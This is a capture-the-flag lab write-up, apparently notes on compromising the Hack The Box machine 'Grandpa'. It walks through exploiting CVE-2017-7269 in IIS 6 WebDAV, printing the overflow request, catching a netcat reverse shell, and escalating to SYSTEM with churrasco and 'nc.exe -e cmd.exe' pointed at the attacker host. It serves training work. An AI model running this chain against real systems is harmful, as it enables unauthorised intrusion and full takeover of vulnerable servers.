As we saw with Nmap it is a web server, if we access to it we can pick some info from the headers

![[Pasted image 20230801081646.png]]

We will use davtest app to check available methods and files format to upload to the server

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14/nmap]
└─$ davtest -url http://10.10.10.14/ -cleanup
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.14
********************************************************
NOTE    Random string for this session: f8ludAJ
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     cgi     FAIL
PUT     cfm     FAIL
PUT     jhtml   FAIL
PUT     pl      FAIL
PUT     html    FAIL
PUT     asp     FAIL
PUT     txt     FAIL
PUT     php     FAIL
PUT     shtml   FAIL
PUT     jsp     FAIL
PUT     aspx    FAIL
********************************************************
 Cleaning up

********************************************************
/usr/bin/davtest Summary:
```

Nothing that we could upload, lets try enumerate directories

```bash
┌──(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14/nmap]
└─$ gobuster dir -u http://10.10.10.14:80/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.10.14:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/08/01 08:18:49 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 152] [--> http://10.10.10.14:80/images/]
/Images               (Status: 301) [Size: 152] [--> http://10.10.10.14:80/Images/]
/IMAGES               (Status: 301) [Size: 152] [--> http://10.10.10.14:80/IMAGES/]
/_private             (Status: 403) [Size: 1529]
Progress: 87650 / 87665 (99.98%)
===============================================================
2023/08/01 08:26:44 Finished
===============================================================
```

Nothing interesting here. After googling some info we found the vulnerability CVE-2017-7269 and **[this github exploit](https://raw.githubusercontent.com/g0rx/iis6-exploit-2017-CVE-2017-7269/master/iis6%20reverse%20shell)** so lets try it

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14]
└─$ python CVE-2017-7269-BOF_exploit.py 10.10.10.14 80 10.10.14.14 1234
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡YAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>

-----------------

┌──(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14/nmap]
└─$ nc -nvlp 1234                                                                                                   
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1030
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
nt authority\network service
```

And we are in, lets escalate privileges. As we are dealing with **Windows 2003** we can use churrasco exploit for Token kidnapping, so upload nc.exe and **[churrasco.exe](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe)** and get a reverse shell with elevated privileges

```bash
┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14]
└─$ wget https://github.com/Re4son/Churrasco/raw/master/churrasco.exe

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14]
└─$ locate nc.exe
/home/kali/Documents/StartingPoint/nc.exe
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14]
└─$ cp /usr/share/windows-resources/binaries/nc.exe .

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14]
└─$ sudo impacket-smbserver share -smb2support .     
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

-------------------------

c:\windows\system32\inetsrv>cd c:\Windows\Temp
cd c:\Windows\Temp

C:\WINDOWS\Temp>copy \\10.10.14.14\share\churrasco.exe churrasco.exe
copy \\10.10.14.14\share\churrasco.exe churrasco.exe
        1 file(s) copied.

C:\WINDOWS\Temp>copy \\10.10.14.14\share\nc.exe nc.exe
copy \\10.10.14.14\share\nc.exe nc.exe
        1 file(s) copied.
```

Now with a netcat listener we try to get a reverse shell

```bash
C:\WINDOWS\Temp>churrasco.exe -d "nc.exe -e cmd.exe 10.10.14.14 1234"

---------------------------

┌──(venv)─(kali㉿kali)-[~/Documents/Boxes/Grandpa-10.10.10.14]
└─$ nc -nvlp 1234                                    
listening on [any] 1234 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.14] 1035
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
nt authority\system
```

And we are nt authority\system!

